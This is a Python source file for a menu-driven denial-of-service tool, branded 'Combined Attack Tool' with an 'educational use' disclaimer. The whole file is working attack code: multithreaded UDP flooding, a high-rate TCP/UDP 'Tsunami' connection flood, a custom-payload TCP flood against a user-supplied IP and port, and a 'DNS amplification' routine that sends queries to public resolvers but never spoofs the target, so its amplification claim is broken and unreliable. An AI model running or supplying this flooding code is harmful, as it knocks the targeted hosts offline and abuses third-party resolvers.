import os
import sys
import socket
import random
import time
import threading
from termcolor import colored
from threading import Thread, Lock

# Farben definieren
COLORS = {
    "menu": "yellow",
    "info": "cyan",
    "success": "green",
    "error": "red"
}

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, COLORS["error"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("*            Combined Attack Tool         *", COLORS["menu"]))
    print(colored("*         Created for Educational Use     *", COLORS["menu"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("Author: Educational Example", COLORS["success"]))
    print(colored("Usage of this tool must comply with all laws.", COLORS["info"]))
    print(colored("WARNING: Unauthorized use of this tool is illegal.", COLORS["error"]))
    print()

# Angriffsfunktionen
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                with socket.socket(socket.AF_INET, sock_type) as sock:
                    sock.sendto(data, (ip, port))
                    with lock:
                        stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed. Packets sent: {stats['packets_sent']}", COLORS["success"]))

def tsunami_attack(ip, port, duration, threads):
    lock = Lock()
    stats = {"requests_sent": 0}

    protocol = input(colored("Select protocol (TCP/UDP): ", COLORS["info"])).lower()
    payload = random._urandom(1024)

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        rps = int(input(colored("Enter requests per second (RPS, Max: 10000): ", COLORS["info"])))
        rps = min(rps, 10000)

        while time.time() < timeout:
            try:
                for _ in range(rps):
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM) as sock:
                        sock.connect((ip, port))
                        sock.send(payload)
                        with lock:
                            stats["requests_sent"] += 1
            except Exception:
                continue

    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"Tsunami attack completed. Requests sent: {stats['requests_sent']}", COLORS["success"]))

def dns_amplification_attack(ip, duration, threads):
    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x07example\x03com\x00\x00\x01\x00\x01")
    open_resolvers = ["8.8.8.8", "1.1.1.1"]
    lock = threading.Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    resolver = random.choice(open_resolvers)
                    sock.sendto(dns_query, (resolver, 53))
                    with lock:
                        stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting DNS Amplification Attack on {ip}", COLORS["menu"]))
    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"DNS Amplification Attack completed. Packets sent: {stats['packets_sent']}", COLORS["success"]))

def custom_payload_attack(ip, port, duration, threads, payload_path):
    try:
        with open(payload_path, "rb") as file:
            payload = file.read()
    except Exception as e:
        print(colored(f"Failed to load payload: {e}", COLORS["error"]))
        return

    lock = threading.Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((ip, port))
                    sock.send(payload)
                    with lock:
                        stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting Custom Payload Attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"Custom Payload Attack completed. Packets sent: {stats['packets_sent']}", COLORS["success"]))

def get_target_info():
    ip = input(colored("Enter target IP: ", COLORS["info"]))
    port = int(input(colored("Enter target port (0 if not applicable): ", COLORS["info"])))
    duration = int(input(colored("Enter attack duration (seconds): ", COLORS["info"])))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", COLORS["info"])))
    return min(threads, 100)

def main():
    while True:
        show_banner()
        print(colored("1. UDP Flood", COLORS["menu"]))
        print(colored("2. Tsunami Attack", COLORS["menu"]))
        print(colored("3. DNS Amplification", COLORS["menu"]))
        print(colored("4. Custom Payload Attack", COLORS["menu"]))
        print(colored("5. Exit", COLORS["error"]))

        choice = input(colored("Select an option: ", COLORS["info"]))

        if choice in ["1", "2", "3", "4"]:
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                tsunami_attack(ip, port, duration, threads)
            elif choice == "3":
                dns_amplification_attack(ip, duration, threads)
            elif choice == "4":
                payload_path = input(colored("Enter path to custom payload: ", COLORS["info"]))
                custom_payload_attack(ip, port, duration, threads, payload_path)
        elif choice == "5":
            print(colored("Exiting... Goodbye!", COLORS["error"]))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", COLORS["error"]))

if __name__ == "__main__":
    main()
